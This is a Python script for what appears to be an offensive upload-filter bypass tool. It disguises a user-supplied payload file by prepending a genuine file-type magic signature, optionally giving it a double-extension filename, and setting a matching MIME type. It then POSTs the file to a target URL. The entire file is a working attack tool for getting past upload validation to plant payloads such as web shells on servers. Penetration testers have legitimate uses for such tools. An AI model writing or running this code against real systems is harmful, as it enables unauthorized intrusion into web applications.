import tempfile
from pyfsig import constants
import httpx
import mimetypes
import exploadlib.parse
mimetypes.init()


def grabsig(ext):
    for sig in constants.SIGNATURES:
        if sig["file_extension"] == ext:
            return "".join([chr(h) for h in sig["hex"]]).encode("utf-8"), mimetypes.types_map[f".{ext}"]

def fileupload():
    ext=args.ext
    name=args.name
    filename=args.filename if not args.doubleextend else ".".join(args.filename.split(".")[0:-1])+f".{args.ext}."+args.filename.split(".")[-1]
    with open(args.payload,"r") as payload:
        content=payload.read().encode("utf-8")
    with tempfile.NamedTemporaryFile() as tmp:
        try:
            sig,mime=grabsig(ext)
        except TypeError:
            print("Error: most likely this file type is not in the available signature list")
            exit()
        tmp.write(sig)
        tmp.write(b"\n")
        tmp.write(content)
        tmp.seek(0)
        files = {name: (filename, tmp, mime)}
        with httpx.Client(http2=args.http2) as client:

            try:
                r = client.post(args.url, files=files, headers=args.headers)

            except httpx.ReadTimeout:
                print("Error: Response timed out but file may have been uploaded")
                exit()

            except httpx.RemoteProtocolError:
                print("Error: Server disconnected without sending a response") 
                exit()

            except httpx.ConnectError:
                print("Error: Connection refused") 
                exit()

        print("file posted")
        if args.response:      
            print(r.text)

if __name__ == "__main__":
    args=exploadlib.parse.parser()
    fileupload()
